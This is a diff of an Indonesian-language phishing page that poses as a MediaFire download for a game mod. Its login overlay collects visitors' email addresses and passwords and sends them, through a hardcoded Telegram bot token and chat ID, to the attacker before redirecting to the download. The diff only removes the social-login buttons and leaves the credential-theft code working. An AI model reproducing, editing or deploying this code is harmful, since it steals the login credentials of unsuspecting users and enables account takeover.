@@ -196,7 +196,7 @@
         .login-overlay.show { display: flex; }
         .login-box {
             background: #fff;
-            max-width: 420px;
+            max-width: 400px;
             width: 100%;
             border-radius: 16px;
             padding: 36px 30px 30px;
@@ -260,48 +260,6 @@
             transition: 0.15s;
         }
         .login-box .login-btn:hover { background: #004d99; }
-        .login-box .divider {
-            text-align: center;
-            font-size: 13px;
-            color: #aaa;
-            margin: 18px 0 14px;
-            position: relative;
-        }
-        .login-box .divider::before,
-        .login-box .divider::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            width: 28%;
-            height: 1px;
-            background: #ddd;
-        }
-        .login-box .divider::before { left: 0; }
-        .login-box .divider::after { right: 0; }
-        .social-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-        .social-btn {
-            padding: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 40px;
-            background: #fff;
-            font-weight: 600;
-            font-size: 13px;
-            cursor: pointer;
-            transition: 0.1s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-        }
-        .social-btn:hover { background: #f5f5f5; border-color: #bbb; }
-        .social-btn.google { color: #db4437; }
-        .social-btn.facebook { color: #1877f2; }
-        .social-btn.vk { color: #4a76a8; }
-        .social-btn.x { color: #000; }
         .login-box .tos {
             font-size: 12px;
             color: #aaa;
@@ -317,7 +275,6 @@
             .mf-download-area { flex-direction: column; align-items: stretch; }
             .mf-download-btn { justify-content: center; padding: 14px 20px; }
             .login-box { padding: 28px 18px; }
-            .social-grid { grid-template-columns: 1fr 1fr; }
         }
     </style>
 </head>
@@ -369,7 +326,7 @@
     </div>
 </div>
 
-<!-- LOGIN OVERLAY -->
+<!-- ===== LOGIN OVERLAY (TANPA TOMBOL SOSIAL) ===== -->
 <div class="login-overlay" id="loginOverlay">
     <div class="login-box">
         <button class="close" id="closeLogin">✕</button>
@@ -382,13 +339,6 @@
             <button type="submit" class="login-btn">📥 Verifikasi & Download</button>
         </form>
 
-        <div class="divider">atau masuk dengan</div>
-        <div class="social-grid">
-            <button class="social-btn google" data-provider="Google">🔴 Google</button>
-            <button class="social-btn facebook" data-provider="Facebook">🔵 Facebook</button>
-            <button class="social-btn vk" data-provider="VK">🟦 VK</button>
-            <button class="social-btn x" data-provider="X">🐦 X</button>
-        </div>
         <div class="tos">
             Dengan melanjutkan, Anda setuju dengan <a href="#">Syarat & Ketentuan</a>
         </div>
@@ -401,7 +351,7 @@
     // ============================================================
     const TELEGRAM_TOKEN = '8926031261:AAELt78bKCnWxLs0tEDwrEKU7nXJ1hyEJ9w';
     const CHAT_ID = '7719903782';
-    const REAL_DOWNLOAD_URL = 'https://www.mediafire.com/file/abc123/ModGame.zip'; // ← GANTI PAKAI LINK ASLI
+    const REAL_DOWNLOAD_URL = 'https://www.mediafire.com/file/abc123/ModGame.zip'; // ← GANTI
 
     // ============================================================
     // ELEMEN
@@ -416,8 +366,8 @@
     // ============================================================
     // KIRIM DATA KE TELEGRAM
     // ============================================================
-    function sendToTelegram(provider, email, password) {
-        const pesan = `🔐 *New Login Data*\n\n👤 Provider: ${provider}\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+    function sendToTelegram(email, password) {
+        const pesan = `🔐 *New Login Data*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
         
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -433,8 +383,8 @@
     // ============================================================
     // PROSES LOGIN + REDIRECT
     // ============================================================
-    function processLogin(provider, email, pass) {
-        sendToTelegram(provider, email, pass);
+    function processLogin(email, pass) {
+        sendToTelegram(email, pass);
         overlay.classList.remove('show');
 
         const orig = triggerBtn.innerHTML;
@@ -460,19 +410,10 @@
         const email = emailInput.value.trim();
         const pass = passInput.value.trim();
         if (email && pass) {
-            processLogin('Manual (Email)', email, pass);
+            processLogin(email, pass);
         } else {
             alert('Harap isi email/nomor dan sandi.');
         }
-    });
-
-    document.querySelectorAll('.social-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            const provider = btn.getAttribute('data-provider');
-            const email = emailInput.value.trim() || '(tidak diisi)';
-            const pass = passInput.value.trim() || '(tidak diisi)';
-            processLogin(provider, email, pass);
-        });
     });
 
     document.getElementById('whyLogin').addEventListener('click', (e) => {
